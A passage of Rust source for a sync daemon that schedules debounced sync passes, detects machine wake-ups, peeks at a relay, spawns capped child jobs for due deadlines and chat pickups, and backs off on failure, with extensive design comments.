//! The daemon (spec §5). This file holds the PURE core — the trigger vocabulary, the
//! scheduler that owns the debounce, and the wake heuristic — all clock-injected, so the
//! behaviour the DoD names is provable without sleeping or standing up a relay. It also holds
//! the sweep this core drives (`Pass`/`sweep`/`Backoff`), the loop itself (`serve`) that ties
//! the pure pieces to the real filesystem/registry (n4dn task 11, `fa65`), and the operational
//! pair that make it safe/observable to run unattended: the single-instance lock and the heartbeat
//! file `status` reads (task 12, `4z4f`) — both of which now live in `nxs-service`, below every
//! crate with a CLI, so an app can read them too (6j6v.5zst).

use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant, SystemTime};

use crate::error::{NxfError, Result};
use crate::sync::{PassOutcome, PresenceNote};
use crate::workspaces::{self, WorkspaceEntry};
use nexus_memory::workspace::MemoryWorkspaceExt;
use nxs_foundation::workspace::Workspace;
use nxs_service::heartbeat::{self, Heartbeat, ServiceState, WorkspaceHealth, WriteFailureLog};
use nxs_service::timers;
use nxs_service::{ServiceHome, ServiceLock};
use nxs_sync::protocol::MachineHello;

/// Why a pass might be due. `2xff` adds `Remote` here (a WebSocket delta) and nothing else
/// in the loop changes — that is the point of routing every source through one vocabulary.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Trigger {
    /// The periodic safety net.
    Interval,
    /// The machine woke from sleep / the network came back.
    Wake,
    /// A local write happened (the `.nxs/last-write` marker moved).
    Nudge,
}

/// Decides WHEN a pass runs. The debounce lives here, once.
pub struct Scheduler {
    interval: Duration,
    debounce: Duration,
    max_wait: Duration,
    last_pass: Instant,
    /// Start of the open nudge burst, if any — the anchor for `max_wait`.
    burst_started: Option<Instant>,
    /// Most recent nudge in the open burst — the anchor for `debounce`.
    last_nudge: Option<Instant>,
    wake_pending: bool,
}

impl Scheduler {
    pub fn new(now: Instant, interval: Duration, debounce: Duration, max_wait: Duration) -> Self {
        Scheduler {
            interval,
            debounce,
            max_wait,
            // Seeded ONE INTERVAL IN THE PAST, not `now` (finding 2, final review): a daemon
            // must sweep on its very first tick, not wait out a full `interval` (300s in
            // production) before doing anything. With `last_pass = now`, a cold start left
            // `due()` false for that whole window — `status` answered `running: false,
            // heartbeat: null` (no heartbeat exists until a pass actually runs) for up to five
            // minutes, and every registered workspace stayed unswept for the same window. That
            // window is exactly the spec's headline "return to the Mac after two days" scenario,
            // except AT START there is no earlier tick for `WakeDetector` to compare against —
            // it seeds its own `last_mono`/`last_wall` from this same `now`, so it has nothing
            // to detect a wake AGAINST on tick one either. `checked_sub` (not plain `-`) so a
            // process started within `interval` of its own monotonic-clock origin never panics.
            last_pass: now.checked_sub(interval).unwrap_or(now),
            burst_started: None,
            last_nudge: None,
            wake_pending: false,
        }
    }

    pub fn on_trigger(&mut self, trigger: Trigger, now: Instant) {
        match trigger {
            Trigger::Wake => self.wake_pending = true,
            Trigger::Nudge => {
                self.burst_started.get_or_insert(now);
                self.last_nudge = Some(now);
            }
            // The interval is not an event to remember — `due` reads the clock for it.
            Trigger::Interval => {}
        }
    }

    pub fn due(&self, now: Instant) -> bool {
        if self.wake_pending {
            return true;
        }
        if let (Some(start), Some(last)) = (self.burst_started, self.last_nudge) {
            // Quiet for `debounce` ⇒ the burst ended. Or `max_wait` since the burst began
            // ⇒ push anyway, so a continuous stream cannot defer the push forever.
            if now.duration_since(last) >= self.debounce
                || now.duration_since(start) >= self.max_wait
            {
                return true;
            }
        }
        now.duration_since(self.last_pass) >= self.interval
    }

    /// Record that a pass just ran, clearing everything it consumed.
    pub fn passed(&mut self, now: Instant) {
        self.last_pass = now;
        self.wake_pending = false;
        self.burst_started = None;
        self.last_nudge = None;
    }
}

/// Detects a sleep/wake cycle without any platform API: the monotonic clock stalls while
/// the machine is asleep, the wall clock does not. A divergence beyond `threshold` between
/// two ticks therefore means we just woke up.
pub struct WakeDetector {
    last_mono: Instant,
    last_wall: SystemTime,
    threshold: Duration,
}

impl WakeDetector {
    pub fn new(mono: Instant, wall: SystemTime, threshold: Duration) -> Self {
        WakeDetector {
            last_mono: mono,
            last_wall: wall,
            threshold,
        }
    }

    pub fn tick(&mut self, mono: Instant, wall: SystemTime) -> bool {
        let mono_delta = mono.duration_since(self.last_mono);
        // A backwards wall clock (NTP correction) yields zero, never a false wake.
        let wall_delta = wall.duration_since(self.last_wall).unwrap_or_default();
        self.last_mono = mono;
        self.last_wall = wall;
        wall_delta.saturating_sub(mono_delta) >= self.threshold
    }
}

/// One pass over one workspace. A trait — not a bare function pointer — so the sweep is testable
/// without a relay: tests substitute a spy that records calls and can be told to fail.
pub trait Pass {
    fn run(&self, ws: &Workspace, endpoint: &str) -> Result<PassOutcome>;
}

/// The production implementation: delegates to the ONE `run_pass` `nxs sync run` also calls, so
/// the push/pull logic exists exactly once (n4dn's whole point — see `sync::run_pass`'s doc).
pub struct RealPass;

impl Pass for RealPass {
    fn run(&self, ws: &Workspace, endpoint: &str) -> Result<PassOutcome> {
        super::run_pass(ws, endpoint)
    }
}

/// The pass the background SERVICE runs (6j6v.f0b5): [`RealPass`]'s sync, then this machine's
/// announcement to the relay — "I am here, and back within `interval_secs`".
///
/// A separate type rather than a flag on `RealPass`, because the difference is who is speaking:
/// only the service may announce, since "online" promises a service is attending the stream. A
/// manual `nxs sync run` and every test that drives `RealPass` announce nothing.
///
/// The machine is read from `home` on EVERY pass, not once at start: a rename
/// (`nxs sync machine <name>`) reaches the relay on the next pass without restarting the service,
/// and a machine file that cannot be read costs only that pass's announcement, never its sync.
pub struct ServicePass {
    home: ServiceHome,
    interval_secs: u64,
}

impl ServicePass {
    /// `interval_secs` is the service's own safety net; what it announces is
    /// [`announced_cadence`] of it — the promise a reader judges this machine against.
    pub fn new(home: ServiceHome, interval_secs: u64) -> ServicePass {
        ServicePass {
            home,
            interval_secs: announced_cadence(interval_secs),
        }
    }
}

/// The cadence a service announces for an `interval` (6j6v.f0b5): the longest it may go between two
/// announcements such that the reader's window (`2 × cadence + 60 s`) absorbs one failed pass.
///
/// **Never shorter than [`BACKOFF_BASE`].** A failed pass announces nothing and the workspace is
/// then excluded for a full backoff — 300 s, whatever the interval — so after one failure the next
/// announcement comes `interval + 300 s` after the last. With a promise of `max(interval, 300)` the
/// window is at least that for every interval; with the interval alone it was not below ~240 s,
/// and a live machine read "offline" for minutes (review of PR #485, Code Quality #6).
///
/// **Never longer than [`MAX_INTERVAL_SECS`](nxs_sync::presence::MAX_INTERVAL_SECS)** (an hour), the
/// longest a relay stores; a service with a longer interval is judged by that and may read offline
/// between passes, which `serve` says once at start.
pub fn announced_cadence(interval_secs: u64) -> u64 {
    interval_secs
        .max(BACKOFF_BASE.as_secs())
        .clamp(1, nxs_sync::presence::MAX_INTERVAL_SECS)
}

/// The log line for an announcement's fate, or `None` when there is nothing to say. `first_time`
/// is whether this is the first unsupported relay this run has seen for the workspace: that one is
/// said once, a failure every time (it is bounded by the pass cadence and each is news).
pub fn presence_log_line(label: &str, note: &PresenceNote, first_time: bool) -> Option<String> {
    match note {
        PresenceNote::Failed(msg) => Some(format!(
            "workspace {label}: synced, but this machine could not announce itself to the relay: \
             {msg}"
        )),
        PresenceNote::Unsupported if first_time => Some(format!(
            "workspace {label}: the relay does not record which machines sync a stream (it \
             predates machine presence, or a gateway in front of it does not route the presence \
             path) — syncing is unaffected, but this machine will not appear in `nxs sync \
             machines` until that changes"
        )),
        PresenceNote::Unsupported | PresenceNote::Recorded => None,
    }
}

/// The log line for a pass that synced but could not regenerate `NEXUS_MEMORY.md` (6j6v.8q88). A
/// function so the sentence is testable — its literal once lost a line continuation and carried a
/// run of spaces into every log line (nxf 6j6v.kat1).
pub fn doc_error_log_line(label: &str, msg: &str) -> String {
    format!("workspace {label}: synced, but NEXUS_MEMORY.md could not be regenerated: {msg}")
}

impl Pass for ServicePass {
    fn run(&self, ws: &Workspace, endpoint: &str) -> Result<PassOutcome> {
        match self.home.machine() {
            Ok(machine) => {
                let hello = MachineHello {
                    machine_id: machine.id,
                    name: machine.name,
                    interval_secs: self.interval_secs,
                };
                super::run_pass_announcing(ws, endpoint, Some(&hello))
            }
            Err(e) => {
                let mut outcome = super::run_pass(ws, endpoint)?;
                outcome.presence = Some(PresenceNote::Failed(format!(
                    "this machine's identity could not be read: {}",
                    e.msg
                )));
                Ok(outcome)
            }
        }
    }
}

/// What one sweep did — the input to the heartbeat file (task 12, `4z4f`) and the daemon's log
/// lines. Every workspace handed to [`sweep`] lands in exactly one bucket.
#[derive(Debug, Default)]
pub struct SweepReport {
    pub synced: Vec<(String, PassOutcome)>,
    pub errors: Vec<(String, String)>,
    pub skipped_unbound: Vec<String>,
    pub skipped_no_endpoint: Vec<String>,
    /// Workspaces whose project-memory document could not be regenerated after a pass that pulled
    /// ops (6j6v.8q88), with the reason. Kept apart from `errors` deliberately: the SYNC succeeded,
    /// so feeding this into the per-workspace backoff would punish a healthy relay for a full disk
    /// or a read-only checkout. The daemon logs it; the stale file itself stays catchable by
    /// `nxm doc --check`, which is the guard that exists for exactly this.
    pub doc_errors: Vec<(String, String)>,
    /// Whether a sweep was actually attempted — `true` whenever [`sweep`] ran, even over an
    /// EMPTY workspace list (every bucket above then stays empty too). `tick`'s not-due branch
    /// returns `SweepReport::default()` without calling `sweep` at all, so `ran` is exactly the
    /// signal task 12's heartbeat needs: "a pass happened", as opposed to "a pass happened AND
    /// found something to report" — the two are NOT the same when the registry has nothing
    /// registered yet, and only the former means the daemon is alive and doing its job.
    pub ran: bool,
}

/// Run one pass per eligible workspace (§5.5). `workspaces` are already-resolved — a registry
/// entry whose path no longer holds a `.nxs/` never reaches here at all (see
/// [`resolve_registered`], one step earlier). This loop skips, WITHOUT error, a workspace that is
/// not bound to a stream, or whose endpoint does not resolve (neither a per-workspace override
/// nor `global`, the loaded default). A skip is a reported state, not an error to spin on, and a
/// failure in one workspace never stops the others — the entire point of a per-workspace sweep
/// rather than one fail-fast pass over the registry.
pub fn sweep(workspaces: &[Workspace], pass: &dyn Pass, global: Option<&str>) -> SweepReport {
    let mut report = SweepReport {
        ran: true,
        ..SweepReport::default()
    };
    for ws in workspaces {
        let label = ws.dir.display().to_string();
        let meta = match super::load(ws) {
            Ok(Some(meta)) => meta,
            // Not bound: sync is opt-in per workspace (§5.5) — a skip, not an error.
            Ok(None) => {
                report.skipped_unbound.push(label);
                continue;
            }
            // A broken workspace (e.g. a malformed sync.toml) must not kill the sweep for its
            // siblings (§5.6) — record it as an error so it stays visible, and move on.
            Err(e) => {
                report.errors.push((label, e.msg));
                continue;
            }
        };
        let endpoint = match super::endpoint::resolve(None, meta.endpoint.as_deref(), global) {
            Ok(url) => url,
            Err(_) => {
                report.skipped_no_endpoint.push(label);
                continue;
            }
        };
        match pass.run(ws, &endpoint) {
            Ok(outcome) => {
                // A pass that PULLED something may have brought memories in from another device
                // (6j6v.8q88). Regenerate this workspace's `NEXUS_MEMORY.md` so the projection is
                // current for whoever opens the repository next — including a reader on a forge,
                // who never runs a session hook at all.
                if outcome.pulled > 0 {
                    if let Err(e) = project_memory_doc(ws) {
                        report.doc_errors.push((label.clone(), e.msg));
                    }
                }
                report.synced.push((label, outcome));
            }
            Err(e) => report.errors.push((label, e.msg)),
        }
    }
    report
}

/// Regenerate `<root>/NEXUS_MEMORY.md` for `ws` after a pass that pulled ops (6j6v.8q88). The
/// daemon's half of "the document is a build product": a device that pulls a memory somebody wrote
/// elsewhere projects it here, without anyone opening the project first.
///
/// The whole addition is a TRIGGER, not new folding. A pass moves the op-log for every domain but
/// folds only flow's views, so a pulled memory sits in the log with `memories` not yet
/// materialized; opening the memory store runs the existing refold-when-behind, and the projection
/// then reads an up-to-date view. Nothing here knows how a fact folds.
///
/// A workspace where memory is not an active module is left alone — opening the store there would
/// create memory's views in a workspace that never asked for them.
fn project_memory_doc(ws: &Workspace) -> Result<()> {
    if !ws
        .config
        .active_modules
        .iter()
        .any(|m| m == nexus_memory::workspace::MEMORY_MODULE)
    {
        return Ok(());
    }
    let store = ws
        .open_memory_store()
        .map_err(|e| NxfError::io(format!("opening the memory store: {}", e.msg)))?;
    let root = ws.dir.parent().unwrap_or(&ws.dir);
    nexus_memory::project_doc::regenerate(&store, root)
        .map(|_| ())
        .map_err(|e| NxfError::io(e.msg))
}

// ---- the executing machine (6j6v.1c6k) ---------------------------------------------------------

/// **How often the relay is asked "anything new?" between passes** (nxf 6j6v.1c6k,
/// `docs/specs/E4-executing-machine.md` §2.5). A chat written on the phone reaches its machine only
/// when that machine pulls; without this it waited for the safety-net interval, up to 300 s. One
/// `GET /ops?since=<cursor>&limit=1` per bound workspace every 15 s — an indexed read that answers
/// with nothing almost every time — and a full pass only when it answers with something. A chat
/// then starts in about 15 to 25 seconds.
pub const PEEK_EVERY: Duration = Duration::from_secs(15);

/// The cheap question, behind a trait for [`Pass`]'s reason: the whole decision is provable without
/// a relay.
pub trait Peek {
    /// Whether the relay holds anything past this workspace's pull cursor.
    fn anything_new(&self, ws: &Workspace, endpoint: &str) -> Result<bool>;
}

/// The production [`Peek`]: one page of at most one op, from the cursor the last pass left.
pub struct RelayPeek;

impl Peek for RelayPeek {
    fn anything_new(&self, ws: &Workspace, endpoint: &str) -> Result<bool> {
        let Some(meta) = super::load(ws)? else {
            return Ok(false);
        };
        use nxs_sync::engine::Transport as _;
        let (ops, _) = nxs_sync::engine::HttpTransport::new(endpoint)
            .pull(
                &nxs_sync::protocol::StreamId(meta.stream_id.clone()),
                nxs_sync::protocol::Cursor(meta.pulled_through),
                1,
            )
            .map_err(|e| NxfError::io(format!("asking the relay for anything new: {e}")))?;
        Ok(!ops.is_empty())
    }
}

/// **Ask every bound workspace's relay whether anything is new, once per [`PEEK_EVERY`]**, and
/// nudge the scheduler into a full pass when one says yes (nxf 6j6v.1c6k). Returns whether it
/// nudged. A workspace in its failure backoff is not asked (the pass is not trying it either), and
/// one whose peek failed is left alone for [`BACKOFF_BASE`].
pub fn peek(
    state: &mut DaemonState,
    now: Instant,
    resolved: &[Workspace],
    peeker: &dyn Peek,
    global: Option<&str>,
) -> bool {
    if state
        .last_peek
        .is_some_and(|last| now.duration_since(last) < PEEK_EVERY)
    {
        return false;
    }
    state.last_peek = Some(now);
    for ws in resolved {
        let quiet = |until: Option<&Instant>| until.is_some_and(|&u| now < u);
        if quiet(state.next_attempt.get(&ws.dir)) || quiet(state.peek_quiet_until.get(&ws.dir)) {
            continue;
        }
        let Ok(Some(meta)) = super::load(ws) else {
            continue;
        };
        let Ok(endpoint) = super::endpoint::resolve(None, meta.endpoint.as_deref(), global) else {
            continue;
        };
        match peeker.anything_new(ws, &endpoint) {
            // The FIRST yes is enough, and the workspaces after it are not asked this round: the
            // pass it triggers sweeps EVERY eligible workspace, so theirs is pulled with it (review
            // of PR #492, Code Quality #2).
            Ok(true) => {
                state.scheduler.on_trigger(Trigger::Nudge, now);
                return true;
            }
            Ok(false) => {}
            Err(_) => {
                state
                    .peek_quiet_until
                    .insert(ws.dir.clone(), now + BACKOFF_BASE);
            }
        }
    }
    false
}

/// Whether a workspace holds an order for this machine that nobody on this machine has taken yet
/// (nxf 6j6v.1c6k). A trait for [`Pass`]'s reason.
pub trait Orders {
    fn owed(&self, ws: &Workspace) -> Result<bool>;
}

/// The production [`Orders`]: this service home's machine and claims, the workspace's chat store.
pub struct ServiceOrders {
    pub home: ServiceHome,
}

impl Orders for ServiceOrders {
    fn owed(&self, ws: &Workspace) -> Result<bool> {
        use nexus_chat::workspace::ChatWorkspaceExt;
        if !ws
            .config
            .active_modules
            .iter()
            .any(|m| m == nexus_chat::workspace::CHAT_MODULE)
        {
            return Ok(false);
        }
        let Some(machine) = self.home.peek_machine()? else {
            return Ok(false);
        };
        let store = ws
            .open_chat_store()
            .map_err(|e| NxfError::io(format!("opening the chat store: {}", e.msg)))?;
        let owed = store
            .orders_owed(&machine.id)
            .map_err(|e| NxfError::io(e.msg))?;
        Ok(owed.iter().any(|m| !self.home.order_claimed(m)))
    }
}

/// What [`pick_up_owed`] started, and what it could not.
#[derive(Debug, Default)]
pub struct PickupSpawns {
    pub started: Vec<String>,
    pub errors: Vec<(String, String)>,
}

/// **After a pass, start `nxs chat pick-up` in every workspace that synced and holds an order for
/// this machine nobody here has taken** (nxf 6j6v.1c6k). The pickup itself — which chat, which
/// message, resumed or started — is the chat engine's (`nexus_chat::orchestration::pick_up`), run
/// as its own process exactly like a deadline's job, so the persona is started by the same code
/// path `nxc` uses and this loop never holds a worker.
///
/// Asked after EVERY pass that synced, not only one that pulled: a pickup whose start failed gave
/// its claims back, and this is where it is tried again.
pub fn pick_up_owed(
    synced: &[(String, PassOutcome)],
    resolved: &[Workspace],
    orders: &dyn Orders,
    spawn: &dyn Spawn,
) -> PickupSpawns {
    let mut report = PickupSpawns::default();
    for (label, _) in synced {
        let Some(ws) = resolved
            .iter()
            .find(|ws| &ws.dir.display().to_string() == label)
        else {
            continue;
        };
        match orders.owed(ws) {
            Ok(false) => {}
            Ok(true) => {
                let root = ws.dir.parent().unwrap_or(&ws.dir);
                let argv = vec!["chat".to_string(), "pick-up".to_string()];
                match spawn.spawn(root, &argv) {
                    Ok(()) => report.started.push(label.clone()),
                    Err(e) => report.errors.push((label.clone(), e.msg)),
                }
            }
            Err(e) => report.errors.push((label.clone(), e.msg)),
        }
    }
    report
}

// ---- the clock (6j6v.8see) --------------------------------------------------------------------

/// Starts one due job. A trait for [`Pass`]'s reason: the whole firing path is provable without
/// spawning anything, and a test can be told to fail a spawn.
pub trait Spawn {
    /// Start `argv` (the arguments AFTER the program) with `dir` as the working directory, and
    /// return without waiting for it.
    fn spawn(&self, dir: &Path, argv: &[String]) -> Result<()>;

    /// How many more jobs this spawner will accept RIGHT NOW.
    ///
    /// Asked before anything is taken out of a deadline book, and that order is the whole point
    /// (review of PR #369–#373, Integrity #1): a deadline is removed from the book at the moment it
    /// is taken, so a spawn that fails afterwards loses the window outright. Asking first means what
    /// cannot be started is never taken — it stays armed and comes due again on the next tick.
    fn capacity(&self) -> usize;
}

/// The production spawner: re-invokes THIS binary.
///
/// Three of the five complaints against the per-deadline launchd agents die here, and they die
/// because of what this does NOT do:
///
/// - **No shell.** `argv` is handed to `exec` as a vector. The old job was a `/bin/sh -c` string
///   with the workspace path spliced into it, which a workspace containing an apostrophe broke.
/// - **No `PATH`.** The program is [`std::env::current_exe`] — the service is already running from
///   the installed binary, so the job cannot fail to find it. The old agent carried a `PATH`
///   beginning with somebody's `target/debug`.
/// - **No plist, no label, no cleanup.** There is nothing to leave behind when a board is closed
///   before its window ends.
///
/// Children are NOT waited on — a tick may legitimately start an agent session that runs for
/// minutes, and the service must stay responsive for every other workspace. They are reaped on
/// later ticks by [`RealSpawn::reap`], so a long-lived service does not accumulate zombies.
///
/// **And there is a ceiling on how many run at once** ([`MAX_OUTSTANDING_JOBS`]). Without one, a
/// tick that found a thousand windows due started a thousand processes, synchronously, on the
/// service's one thread. That is not only the crafted case: a laptop closed over a weekend brings
/// every armed window in every registered workspace due at the same instant.
// **NO `Default`** (review of PR #395, Integrity #1). `RealSpawn::default()` would compile and
// yield `instance: None`, silently skipping the `NXS_SERVICE_INSTANCE` a child needs — which is
// precisely the "half-isolated, and it looks right" failure the `instance` field's own doc warns
// against. Production no longer calls it; removing the derive is what stops a future edit from
// reintroducing it without anything going red. Every constructor below names the instance.
pub struct RealSpawn {
    /// `RefCell` and not a lock: `serve` is a single-threaded loop, and this is only ever touched
    /// from it.
    children: std::cell::RefCell<Vec<std::process::Child>>,
    /// The program to run. `None` — always, in production — means this binary
    /// ([`std::env::current_exe`]).
    ///
    /// Injectable ONLY so the reaping path can be driven against REAL processes: production runs
    /// `nxs` itself, and a test that did the same would have the test harness re-executing itself
    /// (review of PR #369–#373, Test Quality #1 — this path had no coverage at all, and its one
    /// property that already broke in production is pinned elsewhere, by `tests/service_clock.rs`).
    program: Option<PathBuf>,
    /// **Which service instance the child belongs to** (nxf 6j6v.gd9p), passed as
    /// `NXS_SERVICE_INSTANCE`.
    ///
    /// A running service reads its own instance off `argv[0]` — the alias launchd `exec`s it
    /// through. A child cannot: `spawn` below FORCES `argv[0]` to `nxs` so the job's verb routes
    /// (see the comment there), which throws away the very name the parent learned its instance
    /// from. Without this, a `nexus-flow-dev` service would start jobs that consult the PRODUCTION
    /// registry and heartbeat — half-isolated, which is worse than not isolated, because it looks
    /// right.
    ///
    /// **And the child obeys it because of where the binary it runs SITS** (nxf 6j6v.cvpy). Since
    /// that ticket the variable only has a vote for a binary inside a build directory, and the
    /// child's is the service's own program — reached through the alias, which `Origin::ambient`
    /// canonicalises. A development instance is installable only FROM a build, so its alias
    /// resolves into one and the vote stands. Production hands down its own name, so the answer is
    /// production either way.
    ///
    /// `None` only in tests that do not care; production always names it.
    instance: Option<String>,
}

/// How many jobs the service will have running at once.
///
/// Small on purpose. A due deadline runs `nxc tick`, which may go on to start an agent session
/// lasting minutes — forty of those at once is not throughput, it is a machine nobody can use. Eight
/// leaves several boards ticking in parallel while a burst drains over the following ticks, one
/// second apart, instead of arriving all at once. Nothing is lost either way: what does not fit
/// stays in its book.
const MAX_OUTSTANDING_JOBS: usize = 8;

impl RealSpawn {
    /// The production spawner: this binary, for the instance the service is running as.
    fn for_instance(instance: &nxs_service::Instance) -> RealSpawn {
        RealSpawn {
            children: std::cell::RefCell::new(Vec::new()),
            program: None,
            instance: Some(instance.name()),
        }
    }

    /// A spawner that runs `program` instead of this binary — the seam that lets the reaping path
    /// be driven against REAL processes.
    #[cfg(test)]
    fn running(program: impl Into<PathBuf>) -> RealSpawn {
        RealSpawn {
            children: std::cell::RefCell::new(Vec::new()),
            program: Some(program.into()),
            instance: None,
        }
    }

    /// [`running`](RealSpawn::running) for a named instance — the seam that lets what a child
    /// INHERITS be observed, which is the whole of the instance's other channel.
    #[cfg(test)]
    fn running_as(program: impl Into<PathBuf>, instance: &nxs_service::Instance) -> RealSpawn {
        RealSpawn {
            children: std::cell::RefCell::new(Vec::new()),
            program: Some(program.into()),
            instance: Some(instance.name()),
        }
    }

    /// How many child handles are outstanding right now.
    #[cfg(test)]
    fn outstanding(&self) -> usize {
        self.children.borrow().len()
    }

    /// Kill and collect everything still running — so a test never leaves a process behind.
    #[cfg(test)]
    fn kill_outstanding(&self) {
        for child in self.children.borrow_mut().iter_mut() {
            let _ = child.kill();
            let _ = child.wait();
        }
        self.children.borrow_mut().clear();
    }

    /// The program a job runs: this binary, unless a test pinned a different one.
    fn program(&self) -> Result<PathBuf> {
        match &self.program {
            Some(p) => Ok(p.clone()),
            None => std::env::current_exe()
                .map_err(|e| NxfError::io(format!("resolving the current executable: {e}"))),
        }
    }

    /// Collect any finished children. Called once per tick from [`serve`]; cheap and non-blocking
    /// (`try_wait`, never `wait`).
    pub fn reap(&self) {
        self.children.borrow_mut().retain_mut(|child| {
            match child.try_wait() {
                // Still running — a tick may legitimately be driving an agent session for minutes.
                // Keep the handle so a later tick can collect it.
                Ok(None) => true,
                // Finished, or no longer waitable. `try_wait` has already collected the status in
                // the first case, so this `wait` returns it immediately without blocking; saying it
                // explicitly is what tells a reader — and the `zombie_processes` lint — that no
                // child handle is ever dropped un-waited.
                _ => {
                    let _ = child.wait();
                    false
                }
            }
        });
    }
}

impl Spawn for RealSpawn {
    fn capacity(&self) -> usize {
        MAX_OUTSTANDING_JOBS.saturating_sub(self.children.borrow().len())
    }

    fn spawn(&self, dir: &Path, argv: &[String]) -> Result<()> {
        // A backstop, not the mechanism: `fire_deadlines` asks `capacity` first and never takes more
        // than that out of a book, so reaching this is a caller that did not. Refusing loudly is
        // still better than a ceiling that only holds when somebody remembers it.
        if self.capacity() == 0 {
            return Err(NxfError::io(format!(
                "already running {MAX_OUTSTANDING_JOBS} jobs; refusing to start another"
            )));
        }
        let exe = self.program()?;
        let mut cmd = std::process::Command::new(&exe);
        // `argv[0]` FORCED to the umbrella persona, and this is not a detail — the first live run
        // of this path failed on it. `nxs` routes by `argv[0]`, and under launchd the service is
        // `exec`ed through the `nexus-flow` link (that link's whole job is to put a name in the
        // user's background items). `current_exe()` on macOS gives back the path it was `exec`ed
        // with, symlink and all, so `Command::new(exe)` handed the child `argv[0] = nexus-flow` —
        // which routes EVERYTHING to `nxs sync daemon`, and the tick came back as
        // `error: unrecognized subcommand 'chat'`. The job knows which verb it wants; it must say
        // which persona too.
        #[cfg(unix)]
        {
            use std::os::unix::process::CommandExt as _;
            cmd.arg0("nxs");
        }
        // …and because it does, the instance has to travel by the other channel. See the field's
        // own doc: forcing `argv[0]` is exactly what makes a child unable to inherit it.
        if let Some(instance) = &self.instance {
            cmd.env(nxs_service::instance::INSTANCE_ENV, instance);
        }
        let child = cmd
            .args(argv)
            .current_dir(dir)
            // The job is unattended: it must never inherit a terminal to read from, and its output
            // belongs in the service's own log, which is where the agent's `StandardOutPath`
            // already points.
            .stdin(std::process::Stdio::null())
            .spawn()
            .map_err(|e| {
                NxfError::io(format!(
                    "starting `{} {}` in {}: {e}",
                    exe.display(),
                    argv.join(" "),
                    dir.display()
                ))
            })?;
        self.children.borrow_mut().push(child);
        Ok(())
    }
}

/// What one pass over every workspace's deadline book did.
#[derive(Debug, Default, PartialEq, Eq)]
pub struct ClockReport {
    /// `(workspace label, job key)` for every deadline actually started.
    pub fired: Vec<(String, String)>,
    /// `(workspace label, why)` — a book that could not be read, or a job that could not be
    /// started. Deliberately NOT fed into the sync backoff: this is a different failure from a
    /// relay that will not answer, and punishing a workspace's SYNC for a failed tick would be a
    /// surprise nobody asked for.
    pub errors: Vec<(String, String)>,
    /// `(workspace label, count)` for due deadlines this binary could not run — see
    /// [`timers::Due`].
    pub skipped: Vec<(String, usize)>,
    /// `(workspace label, count)` for deadlines that were due and runnable but did not fit inside
    /// this tick's spawn capacity. They stay armed and come due again a second later, so this is
    /// progress reporting, not a fault — an operator watching a burst drain wants to see it.
    pub deferred: Vec<(String, usize)>,
}

/// **Is a run alive in any of these workspaces?** (nxf 6j6v.7q3r)
///
/// The whole input to whether the machine is held awake, in one pure function over the workspaces
/// this service attends — so the DECISION is provable without a power assertion and without a
/// session.
///
/// The reading itself is [`nexus_chat::worker::live_sessions_in`], which is the same pid-file
/// answer `Worker::session_is_running` gives for one session. It is asked of chat rather than
/// spelled here for the reason 6j6v.h383 exists: reaching past a seam into another module's private
/// directory is what that ticket was cut to end, and doing it from the service would be the same
/// mistake with a longer reach.
///
/// It stops at the FIRST live session: the answer is a yes/no, a machine mid-run usually has one in
/// the first workspace looked at, and this is asked on every tick.
pub fn a_run_is_alive(resolved: &[Workspace]) -> bool {
    resolved.iter().any(|ws| {
        let root = ws.dir.parent().unwrap_or(&ws.dir);
        !nexus_chat::worker::live_sessions_in(root).is_empty()
    })
}

/// Fire every deadline that has fallen due, in every resolved workspace (6j6v.8see).
///
/// Runs on EVERY tick, not only on a due sync pass: the clock and the sync are two jobs of one
/// service, and a deadline that waits for the next 300-second safety net is a deadline that missed
/// its window. It is also independent of whether a workspace is BOUND to a stream — a workspace can
/// have windows to keep without syncing anything, and after the owner decision of 2026-08-25 that
/// is the ordinary case for an app-driven project.
///
/// `now` is the service's own wall clock as RFC3339 — passed in, never read here, exactly like
/// every other clock in this module.
pub fn fire_deadlines(resolved: &[Workspace], now: &str, spawn: &dyn Spawn) -> ClockReport {
    let mut report = ClockReport::default();
    // What the spawner will accept this tick, spent across the workspaces in order. A workspace that
    // exhausts it leaves the rest of its own book — and every later workspace's — armed for the next
    // tick, one second away. That is a fair-enough order rather than a fair one, and it is bounded:
    // a book only ever shrinks as it fires, so no workspace can hold the front of the queue for
    // longer than its own backlog takes to drain.
    let mut room = spawn.capacity();
    for ws in resolved {
        let label = ws.dir.display().to_string();
        let due = match timers::take_due(&timers::path_in(&ws.dir), now, room) {
            Ok(due) => due,
            Err(e) => {
                report.errors.push((label, e.msg));
                continue;
            }
        };
        if due.deferred > 0 {
            report.deferred.push((label.clone(), due.deferred));
        }
        let not_run = due.unknown + due.unreadable + due.rejected;
        if not_run > 0 {
            report.skipped.push((label.clone(), not_run));
        }
        // A tick resolves its workspace from the working directory, so the job runs in the
        // workspace ROOT — the directory holding `.nxs/`, not `.nxs/` itself.
        let root = ws.dir.parent().unwrap_or(&ws.dir);
        for deadline in due.fired {
            let Some(argv) = deadline.job.argv() else {
                // Unreachable: `take_due` never hands back a job it could not build an argv for.
                continue;
            };
            let key = deadline
                .job
                .key()
                .map(|k| k.into_owned())
                .unwrap_or_else(|| "?".to_string());
            match spawn.spawn(root, &argv) {
                Ok(()) => {
                    room = room.saturating_sub(1);
                    report.fired.push((label.clone(), key))
                }
                Err(e) => report.errors.push((
                    label.clone(),
                    format!(
                        "the deadline for {key} came due but could not be started: {}",
                        e.msg
                    ),
                )),
            }
        }
    }
    report
}

/// Per-workspace exponential backoff (§5.6): 300s → 600s → 1200s → 1800s, capped, reset on
/// success — so a dead endpoint does not hammer the relay every tick.
pub struct Backoff {
    base: Duration,
    cap: Duration,
    failures: u32,
}

impl Backoff {
    pub fn new(base: Duration, cap: Duration) -> Self {
        Backoff {
            base,
            cap,
            failures: 0,
        }
    }

    pub fn after_failure(&mut self) -> Duration {
        let d = self.base.saturating_mul(1u32 << self.failures.min(16));
        self.failures = self.failures.saturating_add(1);
        d.min(self.cap)
    }

    pub fn after_success(&mut self) {
        self.failures = 0;
    }
}

/// `nxs sync daemon status`: answers "is it running, and what did it last do" from the heartbeat
/// file — no IPC, the same file-based idiom as the write-nudge. A missing heartbeat is
/// `running: false`, a STATE, not an error (task 12 DoD) — this never fails just because the
/// daemon has never run.
///
/// A PRESENT heartbeat is not by itself proof of a live process (task-12 review Finding 3): a
/// `SIGKILL`ed daemon leaves its last heartbeat behind forever, since nothing is left alive to
